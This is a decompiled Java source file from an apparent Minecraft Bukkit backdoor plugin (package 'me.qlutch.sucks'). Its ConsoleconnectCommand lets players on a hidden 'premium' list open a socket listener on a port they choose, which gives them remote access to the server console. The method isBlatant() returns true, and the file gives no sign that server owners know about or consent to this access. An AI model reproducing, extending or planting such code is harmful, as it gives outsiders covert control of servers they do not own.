/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.qlutch.sucks.command.impl.premium;

import me.qlutch.sucks.data.DataManager;
import me.qlutch.sucks.sockets.SocketServer;
import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class ConsoleconnectCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.premium.contains(p2.getName())) {
            if (args.length <= 1) {
                p2.sendMessage(Settings.USAGE("connectconsole <port>"));
            } else if (DataManager.getData().getString("port").equals(args[1])) {
                p2.sendMessage(Settings.PREFIX("The port is already " + args[1]));
                p2.sendMessage(Settings.PREFIX("Connect to the server with the port: " + Settings.RED + args[1]));
            } else {
                DataManager.getData().set("port", (Object)args[1]);
                DataManager.getData().set("connect", (Object)true);
                DataManager.saveData();
                p2.sendMessage(Settings.PREFIX("You can connect to " + Settings.NAME + " console by entering the server ip then the port in the format ip:" + args[1]));
                if (Core.consoleServer != null) {
                    Core.consoleServer.stop();
                }
                Bukkit.getScheduler().runTaskLater((Plugin)plugin, () -> {
                    int port = Integer.parseInt(args[1]);
                    Core.consoleServer = new SocketServer(port);
                }, 1L);
            }
        } else {
            p2.sendMessage(Settings.PREFIX("You must be a " + Settings.RED + "premium user " + Settings.WHITE + " to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

